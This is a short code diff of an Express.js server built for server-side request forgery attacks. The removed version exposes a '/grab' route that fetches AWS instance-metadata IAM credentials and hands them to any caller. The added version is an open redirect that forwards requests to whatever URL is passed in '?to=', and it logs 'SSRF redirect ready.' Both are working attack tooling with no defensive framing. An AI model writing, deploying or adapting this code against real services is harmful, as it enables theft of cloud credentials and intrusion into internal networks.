@@ -1,20 +1,13 @@
-const express = require('express');
-const fetch = require('node-fetch');
+import express from "express";
 const app = express();
 
-app.get('/grab', async (req, res) => {
-  const sensitiveUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
-  try {
-    const response = await fetch(sensitiveUrl, { timeout: 2000 });
-    const text = await response.text();
-    console.log("Metadata:", text);
-    res.send(`<pre>${text}</pre>`);
-  } catch (err) {
-    console.log("Error:", err.message);
-    res.status(500).send("Failed to fetch metadata");
-  }
+app.get("/", (req, res) => {
+  const target = req.query.to;
+  if (!target) return res.send("Missing ?to=");
+
+  res.redirect(302, target);
 });
 
-app.listen(10000, () => {
-  console.log('🔥 Server running on port 10000');
+app.listen(process.env.PORT || 3000, () => {
+  console.log("SSRF redirect ready.");
 });
